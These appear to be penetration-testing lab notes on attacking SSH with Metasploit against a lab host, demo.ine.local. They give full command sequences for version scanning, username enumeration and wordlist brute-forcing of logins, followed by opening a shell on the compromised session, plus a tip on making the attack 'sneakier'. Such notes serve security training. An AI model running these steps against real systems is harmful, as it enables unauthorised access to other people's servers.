- SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.
- It is typically used for remote access to servers and systems.
- SSH uses port 22/tcp by default, however, like other services, it can be configured to use any other open TCP port.
- There are two ways to perform authentication on SSH:
	- Clear-text password
	- Key based authentication (using Public and Private key pair) 
- We can utilize Metasploit Framework auxiliary modules to enumerate the version of SSH running on the target as well as perform brute-force attacks to identify passwords that can consequently provide us remote access to a target.

Practical Demonstration
	- `service postgresql start`
	- `msfconsole`
	- `workspace -a ssh_enum`
	- `setg RHOSTS demo.ine.local`
	- `setg RHOST demo.ine.local`
	- SSH Version Enumeration
		- `search type:auxiliary name:ssh`
		- `use /auxiliary/scanner/ssh/ssh_version`
		- `options`
		- `run`
	- SSH Credential Brute-forcing
		- `search type:auxiliary name:ssh`
		- We can use the `ssh_login` module, if the SSH service is configured to use password authentication.
		- `use auxiliary/scanner/ssh/ssh_login`
		- We can use the `ssh_login_pubkey` module instead, if the SSH service is configured to use Key based authentication.
		- `use auxiliary/scanner/ssh/ssh_login_pubkey`
		- `use auxiliary/scanner/ssh/ssh_login`
		- `options`
		- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
		- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
		- `run`
		- `sessions`
		- `sessions 1`
		- `/bin/bash -i`
		- `ls`
		- `whoami`
		- `exit`
	- SSH Username Enumeration
		- `use auxiliary/scanner/ssh/ssh_enumusers`
		- `options`
		- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
		- It is a good idea to perform Username Enumeration before performing the Brute-force attacks, this would result in less login attempts than trying to Brute-force credentials with all the usernames in the wordlist used, making the Brute-force attack faster and somewhat "sneakier".
